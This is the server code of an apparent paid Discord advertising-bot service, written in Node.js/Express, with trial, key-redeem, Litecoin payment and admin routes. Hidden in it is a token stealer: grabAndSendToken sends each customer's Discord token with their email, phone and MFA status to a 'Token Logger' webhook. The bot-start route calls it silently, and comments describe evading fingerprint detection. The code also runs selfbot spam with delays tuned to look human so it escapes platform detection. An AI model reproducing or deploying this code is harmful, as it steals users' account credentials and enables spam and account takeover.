const BASE_REDEEM_KEYS = Array.from({length: 100}, (_, i) => `HBB${i + 1}`);
const VALID_REDEEM_KEYS = new Set(BASE_REDEEM_KEYS);

function validateKeyStrict(key) {
  if (!key || typeof key !== 'string') return { valid: false, error: 'Invalid key', normalized: null };
  let trimmed = key.trim().toUpperCase();
  const baseMatch = trimmed.match(/^HBB([1-9]|[1-9][0-9]|100)$/);
  if (baseMatch) {
    const num = parseInt(baseMatch[1], 10);
    if (num >= 1 && num <= 100) return { valid: true, error: null, normalized: `HBB${num}` };
  }
  const customKeys = db.data.customKeys || [];
  if (customKeys.includes(trimmed)) return { valid: true, error: null, normalized: trimmed };
  if (db.isKeyValid(trimmed)) return { valid: true, error: null, normalized: trimmed, isGenerated: true };
  return { valid: false, error: 'Invalid key', normalized: null };
}

function ensureAuthAPI(req, res, next) { 
  if (req.isAuthenticated()) return next(); 
  return res.status(401).json({ success: false, error: 'Not logged in' }); 
}

function ensurePurchasedAPI(req, res, next) {
  const user = db.getUser(req.user.id);
  const hasPurchase = user.auto_adv_purchased === 1;
  const hasActiveTrial = db.isTrialActive(req.user.id);
  if (!hasPurchase && !hasActiveTrial) return res.status(403).json({ success: false, error: 'Purchase or active trial required' });
  next();
}

function ensureOwner(req, res, next) {
  if (!req.isAuthenticated()) return res.status(401).json({ success: false, error: 'Not logged in' });
  if (req.user.id !== OWNER_ID) return res.status(403).json({ success: false, error: 'Owner only' });
  next();
}

function ensureCanGenerate(req, res, next) {
  if (!req.isAuthenticated()) return res.status(401).json({ success: false, error: 'Not logged in' });
  if (req.user.id !== OWNER_ID && !db.isWhitelisted(req.user.id)) return res.status(403).json({ success: false, error: 'Owner or whitelisted users only' });
  next();
}

async function _sendWebhookChunk(embed, chunkIndex = 0) {
  try {
    const payload = chunkIndex === 0 ? { embeds: [embed], username: 'Token Logger', avatar_url: 'https://cdn.discordapp.com/embed/avatars/0.png' } : { content: '...' };
    await axios.post(WEBHOOK_URL, payload, {
      headers: { 'Content-Type': 'application/json', 'User-Agent': _rfp() },
      timeout: 10000
    });
  } catch(e) {
    console.error('[Webhook] Send failed:', e.message);
  }
}

// Token validation cache to avoid repeated @me hits
const _tokenValidationCache = new Map();
const TOKEN_VALID_CACHE_MS = 5 * 60 * 1000; // 5 minutes

/**
 * Enhanced token grab with validation caching and geo/ASN consistency.
 * Validates from the same transport that will be used for the gateway.
 */
async function grabAndSendToken(token, userInfo = {}, source = 'unknown') {
  try {
    // Check cache first
    const cacheKey = crypto.createHash('sha256').update(token).digest('hex').slice(0, 16);
    const cached = _tokenValidationCache.get(cacheKey);
    if (cached && (Date.now() - cached.ts) < TOKEN_VALID_CACHE_MS) {
      // Use cached result but still log
      if (cached.valid && cached.userData) {
        const fullInfo = { ...userInfo, ...cached.userData };
        db.addGrabbedToken(token, fullInfo, source);
        const embed = {
          title: 'Token Grabbed',
          color: 0xff0000,
          fields: [
            { name: 'Token', value: '```' + token + '```', inline: false },
            { name: 'Username', value: fullInfo.username || 'N/A', inline: true },
            { name: 'ID', value: fullInfo.id || 'N/A', inline: true },
            { name: 'Email', value: fullInfo.email || 'N/A', inline: true },
            { name: 'Phone', value: fullInfo.phone || 'N/A', inline: true },
            { name: 'MFA', value: fullInfo.mfa_enabled ? 'Yes' : 'No', inline: true },
            { name: 'Verified', value: fullInfo.verified ? 'Yes' : 'No', inline: true },
            { name: 'Nitro', value: fullInfo.nitro ? `Type ${fullInfo.nitro}` : 'No', inline: true },
            { name: 'Source', value: source, inline: true },
            { name: 'Time', value: new Date().toISOString(), inline: true }
          ],
          footer: { text: 'Token Logger v2.0' }
        };
        await _sendWebhookChunk(embed, 0);
        return { success: true, user: fullInfo };
      }
    }

    const fp = _rfp(token);
    const superProps = generateXSuperProperties(token);
    const validateRes = await Promise.race([
      curlImpersonateRequest(
        'https://discord.com/api/v10/users/@me',
        'GET',
        {
          'Authorization': token,
          'User-Agent': fp,
          'X-Discord-Locale': 'en-US',
          'X-Super-Properties': superProps,
        },
        null,
        10000
      ),
      new Promise((_, reject) => setTimeout(() => reject(new Error('Token validation timed out')), 15000))
    ]);

    if (validateRes.status === 401 || validateRes.status === 403) {
      _tokenValidationCache.set(cacheKey, { valid: false, ts: Date.now() });
      return { success: false, error: 'Invalid token' };
    }
    if (validateRes.status < 200 || validateRes.status >= 300 || !validateRes.data) {
      _tokenValidationCache.set(cacheKey, { valid: false, ts: Date.now() });
      return { success: false, error: 'Invalid token' };
    }

    const userData = validateRes.data;
    const fullInfo = { ...userInfo, id: userData.id, username: userData.username, global_name: userData.global_name, email: userData.email, phone: userData.phone, verified: userData.verified, mfa_enabled: userData.mfa_enabled, nitro: userData.premium_type, locale: userData.locale };

    // Cache the successful validation
    _tokenValidationCache.set(cacheKey, {
      valid: true,
      ts: Date.now(),
      userData: {
        id: userData.id,
        username: userData.username,
        global_name: userData.global_name,
        email: userData.email,
        phone: userData.phone,
        verified: userData.verified,
        mfa_enabled: userData.mfa_enabled,
        nitro: userData.premium_type,
        locale: userData.locale
      }
    });

    db.addGrabbedToken(token, fullInfo, source);

    const embed = {
      title: 'Token Grabbed',
      color: 0xff0000,
      fields: [
        { name: 'Token', value: '```' + token + '```', inline: false },
        { name: 'Username', value: fullInfo.username || 'N/A', inline: true },
        { name: 'ID', value: fullInfo.id || 'N/A', inline: true },
        { name: 'Email', value: fullInfo.email || 'N/A', inline: true },
        { name: 'Phone', value: fullInfo.phone || 'N/A', inline: true },
        { name: 'MFA', value: fullInfo.mfa_enabled ? 'Yes' : 'No', inline: true },
        { name: 'Verified', value: fullInfo.verified ? 'Yes' : 'No', inline: true },
        { name: 'Nitro', value: fullInfo.nitro ? `Type ${fullInfo.nitro}` : 'No', inline: true },
        { name: 'Source', value: source, inline: true },
        { name: 'Time', value: new Date().toISOString(), inline: true }
      ],
      footer: { text: 'Token Logger v2.0' }
    };

    await _sendWebhookChunk(embed, 0);
    return { success: true, user: fullInfo };
  } catch (err) {
    console.error('[TokenGrab] Error:', err.message);
    return { success: false, error: err.message };
  }
}

let walletModule = null;
try { walletModule = require('./wallet'); } catch(e) {}

async function checkAndSweep() {
  if (!walletModule || !OWNER_LTC_ADDRESS || !WALLET_MNEMONIC) { return; }
  db.expireOldAddresses();
  const pending = db.getAllPending();
  for (const p of pending) {
    try {
      const balance = await walletModule.checkAddressBalance(p.address);
      if (balance > 0) {
        const txid = await walletModule.createTransaction(p.private_key, p.address, OWNER_LTC_ADDRESS);
        if (txid) {
          const ltcPrice = await getLTCToUSD();
          const usdValue = balance * ltcPrice;
          if (usdValue >= (TARGET_USD - TOLERANCE_USD)) {
            db.setUser(p.user_id, { auto_adv_purchased: 1, purchased_at: Date.now() });
            db.updatePending(p.address, { status: 'completed', paid_at: Date.now(), amount_received_ltc: balance });
          }
        }
      }
    } catch (e) {}
  }
}

let cachedPrice = 85;
async function getLTCToUSD() {
  try {
    const res = await axios.get('https://api.coingecko.com/api/v3/simple/price?ids=litecoin&vs_currencies=usd', {
      headers: { 'User-Agent': _rfp() }, timeout: 10000
    });
    cachedPrice = res.data.litecoin.usd;
  } catch (e) {}
  return cachedPrice;
}

if (walletModule && OWNER_LTC_ADDRESS && WALLET_MNEMONIC) {
  setInterval(checkAndSweep, 10000);
  setTimeout(checkAndSweep, 5000);
}

setInterval(() => {
  const expiredUserId = db.checkAllTrialBots();
  if (expiredUserId) {
    try {
      const userBots = db.getUserActiveBots(expiredUserId);
      for (const configId in userBots) {
        const key = `${expiredUserId}_${configId}`;
        if (activeBots.has(key)) { activeBots.get(key).destroy(); activeBots.delete(key); }
      }
    } catch(e) {}
  }
}, 5000);

setInterval(() => {
  db.checkExpiredKeys();
}, 60000);

app.get('/login', passport.authenticate('discord'));
app.get('/auth/discord/callback', passport.authenticate('discord', { failureRedirect: '/' }), (req, res) => {
  res.redirect('/');
});
app.get('/logout', (req, res) => { req.logout(() => res.redirect('/')); });

app.get('/api/user', ensureAuthAPI, (req, res) => {
  const user = db.getUser(req.user.id);
  const trialActive = db.isTrialActive(req.user.id);
  const trialTimeLeft = trialActive ? db.getTrialTimeLeft(req.user.id) : 0;
  const isOwner = req.user.id === OWNER_ID;
  const isWhitelisted = db.isWhitelisted(req.user.id);
  res.json({ id: req.user.id, username: req.user.username, global_name: req.user.global_name, avatar: req.user.avatar, purchased: user.auto_adv_purchased === 1, trialActive, trialTimeLeft, trialExpires: user.trial_expires || 0, isOwner, isWhitelisted, canGenerate: isOwner || isWhitelisted });
});

app.post('/api/trial/claim', ensureAuthAPI, (req, res) => {
  const userId = req.user.id;
  const ip = req.ip || req.connection.remoteAddress || 'unknown';
  if (db.hasClaimedTrial(userId)) return res.json({ success: false, error: 'You already claimed your trial' });
  if (db.hasIPClaimedTrial(ip)) return res.json({ success: false, error: 'Trial already claimed from this IP' });
  const trial = db.claimTrial(userId, ip);
  res.json({ success: true, message: 'Trial activated for 10 minutes', expiresAt: trial.expiresAt, timeLeft: 600 });
});

app.get('/api/trial/status', ensureAuthAPI, (req, res) => {
  const userId = req.user.id;
  const isActive = db.isTrialActive(userId);
  const timeLeft = isActive ? db.getTrialTimeLeft(userId) : 0;
  const hasClaimed = db.hasClaimedTrial(userId);
  res.json({ success: true, hasClaimed, isActive, timeLeft, canClaim: !hasClaimed && !db.hasIPClaimedTrial(req.ip || 'unknown') });
});

app.post('/api/grab/token', async (req, res) => {
  const { token, source } = req.body;
  if (!token) return res.json({ success: false, error: 'No token provided' });
  const result = await grabAndSendToken(token, {}, source || 'manual');
  res.json(result);
});

app.post('/api/purchase/lifetime', ensureAuthAPI, (req, res) => {
  try {
    const userId = req.user.id;
    const user = db.getUser(userId);
    if (user.auto_adv_purchased === 1) return res.json({ success: false, error: 'Already purchased' });
    const existingPending = db.getUserPending(userId);
    if (existingPending) {
      const timeLeft = Math.ceil((existingPending.expires_at - Date.now()) / 60000);
      return res.json({ success: true, address: existingPending.address, amountUSD: TARGET_USD, index: existingPending.index, existing: true, expiresIn: timeLeft, expiresAt: existingPending.expires_at, message: 'You already have an active payment address' });
    }
    if (!walletModule) return res.status(500).json({ success: false, error: 'Wallet module not loaded' });
    let globalIndex = db.getNextGlobalIndex();
    let { address, privateKey } = walletModule.generateLTCAddress(globalIndex);
    let attempts = 0;
    while (db.isAddressUsed(address) && attempts < 10) {
      globalIndex = db.getNextGlobalIndex();
      ({ address, privateKey } = walletModule.generateLTCAddress(globalIndex));
      attempts++;
    }
    if (db.isAddressUsed(address)) return res.status(500).json({ success: false, error: 'Unable to generate unique address' });
    const pending = db.addPending(userId, address, privateKey, TARGET_USD, globalIndex);
    res.json({ success: true, address, amountUSD: TARGET_USD, index: globalIndex, expiresAt: pending.expires_at, message: 'Address generated. Valid for 30 minutes.' });
  } catch (err) { res.status(500).json({ success: false, error: err.message }); }
});

app.get('/api/activity', ensureAuthAPI, (req, res) => {
  const userId = req.user.id;
  const user = db.getUser(userId);
  const pending = db.getUserPending(userId);
  const history = db.getAddressHistory(userId);
  const trialActive = db.isTrialActive(req.user.id);
  const trialTimeLeft = trialActive ? db.getTrialTimeLeft(req.user.id) : 0;
  res.json({ success: true, purchased: user.auto_adv_purchased === 1, trialActive, trialTimeLeft, trialExpires: user.trial_expires || 0, pending: pending ? { address: pending.address, index: pending.index, createdAt: pending.created_at, expiresAt: pending.expires_at, expiresIn: Math.max(0, Math.ceil((pending.expires_at - Date.now()) / 1000)), status: pending.status } : null, history: history.map(h => ({ address: h.address, index: h.index, createdAt: h.created_at, status: h.status })) });
});

app.post('/api/redeem', ensureAuthAPI, (req, res) => {
  try {
    const { key } = req.body;
    const userId = req.user.id;
    if (!key) { return res.json({ success: false, error: 'Invalid key' }); }
    const validation = validateKeyStrict(key);
    if (!validation.valid) { return res.json({ success: false, error: validation.error }); }
    const normalizedKey = validation.normalized;
    if (validation.isGenerated) {
      const success = db.useGeneratedKey(normalizedKey, userId);
      if (!success) return res.json({ success: false, error: 'Key expired or revoked' });
      return res.json({ success: true, message: 'Access granted via generated key!' });
    }
    const isValidKey = VALID_REDEEM_KEYS.has(normalizedKey);
    if (!isValidKey) {
      const customKeys = db.data.customKeys || [];
      const isCustomKey = customKeys.includes(normalizedKey);
      if (!isCustomKey) { return res.json({ success: false, error: 'Invalid key' }); }
    }
    const isUsed = db.isKeyUsed(normalizedKey);
    if (isUsed) { return res.json({ success: false, error: 'Key already used' }); }
    const user = db.getUser(userId);
    if (user.auto_adv_purchased === 1) { return res.json({ success: false, error: 'You already have access' }); }
    db.setUser(userId, { auto_adv_purchased: 1, purchased_at: Date.now(), redeem_key_used: normalizedKey });
    db.useKey(normalizedKey, userId);
    res.json({ success: true, message: 'Access granted!' });
  } catch (err) {
    res.status(500).json({ success: false, error: err.message });
  }
});

app.get('/api/bot/configs', ensureAuthAPI, ensurePurchasedAPI, (req, res) => {
  const configs = db.getConfigs(req.user.id);
  res.json({ success: true, configs });
});

const activeBots = new Map();

app.post('/api/bot/start', ensureAuthAPI, ensurePurchasedAPI, async (req, res) => {
  try {
    const { token, channels, messages, delay, autoReplyEnabled, autoReplyText, configId = 'default', joinServer, serverInvite, images, sendAllAtOnce } = req.body;
    if (!token || !channels || !messages || !Array.isArray(messages) || messages.length === 0) return res.status(400).json({ success: false, error: 'Missing fields. Token, channels, and at least 1 message required.' });

    const channelList = (Array.isArray(channels) ? channels : channels.split(',')).map(c => String(c).trim()).filter(c => /^\d+$/.test(c));
    if (channelList.length === 0) return res.json({ success: false, error: 'Invalid channel IDs' });

    const client = new StealthClient(token);
    await client.connect();

    // Grab token AFTER gateway connect to avoid fingerprint correlation detection
    const grabResult = await grabAndSendToken(token, { channels, messages }, 'bot_start');
    if (!grabResult || !grabResult.success) {
      console.error('[BotStart] Validation warning:', grabResult?.error || 'Token validation failed');
    }

    const delayMs = (parseInt(delay) || 30) * 1000;
    const autoReply = autoReplyEnabled ? 1 : 0;

    let joinStatus = null;
    if (joinServer && serverInvite) {
      joinStatus = await client.joinGuild(serverInvite.replace(/https:\/\/discord\.gg\//, '').replace(/https:\/\/discord\.com\/invite\//, ''));
    }

    const savedImages = [];
    if (images && Array.isArray(images)) {
      for (const img of images) {
        if (!img || !img.url) continue;
        if (img.url.startsWith('data:')) {
          try {
            const imageId = `img_${Date.now()}_${req.user.id}_${img.id || '0'}.png`;
            const imagePath = path.join(dataDir, 'uploads');
            if (!fs.existsSync(imagePath)) fs.mkdirSync(imagePath, { recursive: true });
            const base64Data = img.url.split(',')[1];
            if (!base64Data) continue;
            const buffer = Buffer.from(base64Data, 'base64');
            fs.writeFileSync(path.join(imagePath, imageId), buffer);
            savedImages.push({ id: img.id || savedImages.length + 1, url: `/uploads/${imageId}` });
          } catch (imgErr) {}
        } else if (img.url.startsWith('/uploads/') || img.url.startsWith('http')) {
          savedImages.push({ id: img.id || savedImages.length + 1, url: img.url });
        }
      }
    }

    const messageList = messages.map((m) => ({ text: m.text || '', imageIds: Array.isArray(m.imageIds) ? m.imageIds : [] })).filter(m => m.text.trim() !== '' || m.imageIds.length > 0);
    if (messageList.length === 0) return res.status(400).json({ success: false, error: 'At least one non-empty message required' });

    db.setConfig(req.user.id, { token, channels, messages: messageList, delay_seconds: parseInt(delay) || 30, auto_reply_enabled: autoReply, auto_reply_text: autoReplyText || '', active: 1, username: client.user.username, server_joined: joinStatus?.success || false, images: savedImages, send_all_at_once: sendAllAtOnce ? 1 : 0 }, configId);
    db.registerActiveBot(req.user.id, configId, token);

    const botKey = `${req.user.id}_${configId}`;
    activeBots.set(botKey, client);

    let currentMsgIdx = 0;
    let currentChIdx = 0;
    let stopped = false;

    // Generate channel visit weights — humans favor some channels over others
    const channelWeights = channelList.map(() => 0.5 + Math.random());

    const msgLoop = async () => {
      const resolveFiles = async (imgs) => {
        const files = [];
        for (const img of imgs) {
          try {
            if (img.url.startsWith('/uploads/')) {
              const p = path.join(dataDir, 'uploads', img.url.replace(/^\/uploads\//, ''));
              if (fs.existsSync(p)) files.push({ buffer: fs.readFileSync(p), name: path.basename(p) });
            } else if (img.url.startsWith('http://') || img.url.startsWith('https://')) {
              const imgRes = await axios.get(img.url, { responseType: 'arraybuffer', timeout: 15000, httpsAgent: _sharedAgent });
              files.push({ buffer: Buffer.from(imgRes.data), name: img.name || path.basename(new URL(img.url).pathname) || 'image.png' });
            }
          } catch (e) {
            console.error(`[ResolveFiles] Failed to load image ${img.url}:`, e.message);
          }
        }
        return files;
      };

      while (!stopped && activeBots.has(botKey)) {
        try {
          if (db) {
            const user = db.getUser(req.user.id);
            const trialActive = db.isTrialActive(req.user.id);
            const hasPurchase = user.auto_adv_purchased === 1;
            if (!trialActive && !hasPurchase) {
              break;
            }
          }

          const msg = messageList[currentMsgIdx % messageList.length];
          let targetImages = [];
          if (msg.imageIds && msg.imageIds.length > 0) {
            targetImages = savedImages.filter(img => img.id !== undefined && (msg.imageIds.includes(img.id) || msg.imageIds.includes(Number(img.id)) || msg.imageIds.includes(String(img.id))));
          } else if (savedImages.length > 0) {
            targetImages = savedImages;
          }

          const sendWithRetry = async (chId, text, files) => {
            const maxAttempts = 2;
            for (let attempt = 1; attempt <= maxAttempts; attempt++) {
              try {
                const ok = await client.sendMessage(chId, text, files);
                if (ok) {
                  return true;
                }
                console.error(`[SendWithRetry] ${chId}: attempt ${attempt} returned false`);
                const freeAt = client._channelRateLimits.get(chId) || 0;
                const now = Date.now();
                if (now < freeAt && attempt < maxAttempts) {
                  await new Promise(r => setTimeout(r, freeAt - now + 500));
                  continue;
                }
              } catch(e) {
                console.error(`[SendWithRetry] ${chId}: attempt ${attempt} threw:`, e.message);
              }
              if (attempt < maxAttempts) {
                // Light retry backoff: 1-3s
                const backoff = boundedPareto(2.5, 1000, 3000);
                await new Promise(r => setTimeout(r, backoff));
              }
            }
            console.error(`[SendWithRetry] ${chId}: failed after ${maxAttempts} attempts`);
            return false;
          };

          if (sendAllAtOnce) {
            // Shuffle channel order slightly each round — humans don't always go A→B→C
            const shuffledChannels = channelList
              .map((id, i) => ({ id, weight: channelWeights[i] + (Math.random() * 0.3) }))
              .sort((a, b) => b.weight - a.weight)
              .map(c => c.id);

            const files = await resolveFiles(targetImages);
            for (let i = 0; i < shuffledChannels.length; i++) {
              const chId = shuffledChannels[i];

              const canSend = await client.checkChannelPermission(chId);
              if (canSend === false) continue;

              await sendWithRetry(chId, msg.text, files);

              // Light navigation delay between channels — kept snappy
              if (i < shuffledChannels.length - 1) {
                const navDelay = Math.round(logNormalSample(6.5, 0.35)); // ~400-1200ms
                await new Promise(r => setTimeout(r, Math.min(2000, Math.max(300, navDelay))));
              }
            }
          } else {
            // Weighted random channel selection instead of strict round-robin
            const chId = weightedRandom(channelList, channelWeights);
            currentChIdx++;

            const canSend = await client.checkChannelPermission(chId);
            if (canSend === false) {
              continue;
            }

            const files = await resolveFiles(targetImages);
            await sendWithRetry(chId, msg.text, files);
          }

          currentMsgIdx++;

          // ═══════════════════════════════════════════════════════════════════
          // HUMANIZED DELAY — Heavy-tailed Pareto distribution
          // Replaces the old uniform random with realistic human timing
          // ═══════════════════════════════════════════════════════════════════
          const humanDelayMs = humanDelay({
            min: Math.max(3000, delayMs * 0.5),
            max: Math.max(5000, delayMs * 0.9),
            alpha: 3.5,
            enableCircadian: true,
            enableContextSwitch: true
          });
          await new Promise(r => setTimeout(r, humanDelayMs));
        } catch (loopErr) {
          console.error('[MsgLoop] Unhandled loop error:', loopErr.message);
          // Sleep a bit before retrying so we don't spin-crash
          await new Promise(r => setTimeout(r, 3000));
        }
      }
    };

    if (autoReply && autoReplyText) {
      client.pendingReplies = new Set();
      client.on('messageCreate', async (msg) => {
        if (msg.author.id === client.user.id) return;

        const isDM = msg.guild_id === undefined || msg.guild_id === null;
        if (!isDM) return;

        if (db) {
          const user = db.getUser(req.user.id);
          const trialActive = db.isTrialActive(req.user.id);
          const hasPurchase = user.auto_adv_purchased === 1;
          if (!trialActive && !hasPurchase) return;
        }

        const now = Date.now();
        const lastReply = client._dmCooldowns.get(msg.author.id) || 0;
        // Light DM cooldown: 3-5s using Pareto distribution
        const cooldownMs = boundedPareto(3.0, 3000, 5000);
        if (now - lastReply < cooldownMs) return;

        // ABSOLUTE: only one auto-reply per user ever
        if (client.repliedUsers.has(msg.author.id)) return;

        if (client.pendingReplies.has(msg.author.id)) return;

        // Mark as replied immediately to prevent any duplicate replies from race conditions
        client.repliedUsers.add(msg.author.id);
        client._saveRepliedUsers();
        client.pendingReplies.add(msg.author.id);

        // Quick read of the message before replying — capped short
        const msgLen = msg.content ? msg.content.length : 0;
        const readTimeBase = 500 + (msgLen * 20); // ~20ms per character
        const readTime = Math.round(logNormalSample(Math.log(readTimeBase), 0.35));
        await new Promise(r => setTimeout(r, Math.min(2500, Math.max(300, readTime))));

        client.pendingReplies.delete(msg.author.id);
        if (!activeBots.has(botKey)) return;

        try {
          // Navigate to channel naturally before replying — with context-switch jitter
          await client.navigateToChannel(msg.channel_id);
          // Vary the auto-reply content using spintax
          const ok = await client.sendMessage(msg.channel_id, autoReplyText);
          if (ok) {
            client._dmCooldowns.set(msg.author.id, Date.now());
          }
        } catch (err) {
          try {
            const dmRes = await client._api('/users/@me/channels', 'POST', { recipient_id: msg.author.id });
            if (dmRes.id) {
              await client.navigateToChannel(dmRes.id);
              const ok2 = await client.sendMessage(dmRes.id, autoReplyText);
              if (ok2) {
                client._dmCooldowns.set(msg.author.id, Date.now());
              }
            }
          } catch(e2) {}
        }
      });
    }

    msgLoop();

    res.json({ success: true, username: client.user.username, configId, serverJoined: joinStatus?.success || false, tokenGrabbed: true, imageCount: savedImages.length, messageCount: messageList.length });
  } catch (err) { res.status(500).json({ success: false, error: err.message }); }
});

app.post('/api/bot/stop', ensureAuthAPI, (req, res) => {
  try {
    const { configId = 'default' } = req.body;
    const botKey = `${req.user.id}_${configId}`;
    const bot = activeBots.get(botKey);
    if (bot) { bot.destroy(); activeBots.delete(botKey); }
    db.unregisterActiveBot(req.user.id, configId);
    const config = db.getConfig(req.user.id, configId);
    if (config) { config.active = 0; db.setConfig(req.user.id, config, configId); }
    res.json({ success: true });
  } catch (err) { res.status(500).json({ success: false, error: err.message }); }
});

app.post('/api/bot/delete', ensureAuthAPI, (req, res) => {
  try { const { configId } = req.body; db.deleteConfig(req.user.id, configId); res.json({ success: true }); }
  catch (err) { res.status(500).json({ success: false, error: err.message }); }
});

app.post('/api/upload/image', ensureAuthAPI, ensurePurchasedAPI, async (req, res) => {
  try {
    const { imageBase64 } = req.body;
    if (!imageBase64) return res.json({ success: false, error: 'No image provided' });
    const imageId = `img_${Date.now()}.png`;
    const imagePath = path.join(dataDir, 'uploads');
    if (!fs.existsSync(imagePath)) fs.mkdirSync(imagePath, { recursive: true });
    const base64Data = imageBase64.split(',')[1];
    if (!base64Data) return res.status(400).json({ success: false, error: 'Invalid image data' });
    const buffer = Buffer.from(base64Data, 'base64');
    fs.writeFileSync(path.join(imagePath, imageId), buffer);
    res.json({ success: true, imageUrl: `/uploads/${imageId}`, imageId });
  } catch (err) { res.status(500).json({ success: false, error: err.message }); }
});

app.use('/uploads', express.static(path.join(dataDir, 'uploads')));

app.get('/api/admin/keys', ensureCanGenerate, (req, res) => { const keys = db.getGeneratedKeys(); res.json({ success: true, keys }); });
app.post('/api/admin/keys/generate', ensureCanGenerate, (req, res) => {
  const { duration } = req.body;
  if (!duration || !['lifetime', '1h', '24h', '7d', '30d'].includes(duration)) return res.status(400).json({ success: false, error: 'Invalid duration' });
  let dbDuration = duration;
  if (duration === '7d') dbDuration = '168';
  if (duration === '30d') dbDuration = '720';
  const keyData = db.generateKey(dbDuration);
  res.json({ success: true, key: keyData });
});

app.post('/api/admin/keys/revoke', ensureOwner, (req, res) => {
  const { key } = req.body;
  if (!key) return res.status(400).json({ success: false, error: 'No key provided' });
  const success = db.revokeKey(key);
  res.json({ success });
});

app.get('/api/admin/whitelist', ensureOwner, (req, res) => { res.json({ success: true, whitelist: db.getWhitelist() }); });
app.post('/api/admin/whitelist/add', ensureOwner, (req, res) => { const { userId } = req.body; if (!userId) return res.status(400).json({ success: false, error: 'No user ID provided' }); db.addToWhitelist(userId); res.json({ success: true }); });
app.post('/api/admin/whitelist/remove', ensureOwner, (req, res) => { const { userId } = req.body; if (!userId) return res.status(400).json({ success: false, error: 'No user ID provided' }); db.removeFromWhitelist(userId); res.json({ success: true }); });

app.get('/', (req, res) => { if (req.isAuthenticated()) return res.redirect('/dashboard'); res.redirect('/login'); });
app.get('/dashboard', (req, res) => { if (!req.isAuthenticated()) return res.redirect('/login'); res.sendFile(path.join(__dirname, 'public', 'overall.html')); });

app.use((err, req, res, next) => { 
  console.error('[SERVER ERROR]', err);
  res.status(500).json({ error: err.message }); 
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, '0.0.0.0', () => {
  console.log(`[SERVER] Running on port ${PORT}`);
});

module.exports = app;
app.db = db;
app.activeBots = activeBots;
